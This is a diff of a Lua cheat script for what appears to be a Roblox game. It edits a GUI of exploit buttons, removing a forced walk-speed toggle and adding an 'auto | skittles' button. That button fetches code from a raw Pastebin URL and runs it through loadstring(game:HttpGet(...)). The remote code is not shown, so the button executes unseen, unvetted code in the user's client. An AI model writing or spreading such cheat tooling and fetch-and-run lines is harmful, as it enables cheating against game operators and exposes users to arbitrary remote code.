@@ -9,6 +9,10 @@ local Home = UI:addPage("main", 1, true, 6)
 
 Home:addLabel("⚙️main", "main functions")
 
+
+
+
+
 Home:addButton("remove | camerashake", function()
     local g_ = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob")
     if g_ then g_:Destroy() end
@@ -243,24 +247,10 @@ local characterpage = UI:addPage("🧍character", 2, false, 6)
 characterpage:addLabel("🧍character", "all the features of character")
 
 
-characterpage:addToggle("2x | speed", function(value)
-    local player = game.Players.LocalPlayer
-    local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+characterpage:addButton("auto | skittles", function()
+    
+loadstring(game:HttpGet("https://pastebin.com/raw/eB7W81Ey"))()
 
-    if humanoid then
-        if value == false then
-            speedLoop = false
-            humanoid.WalkSpeed = 13
-        else
-            speedLoop = true
-            task.spawn(function()
-                while speedLoop do
-                    humanoid.WalkSpeed = 24
-                    wait(0.1)
-                end
-            end)
-        end
-    end
 end)
 
 
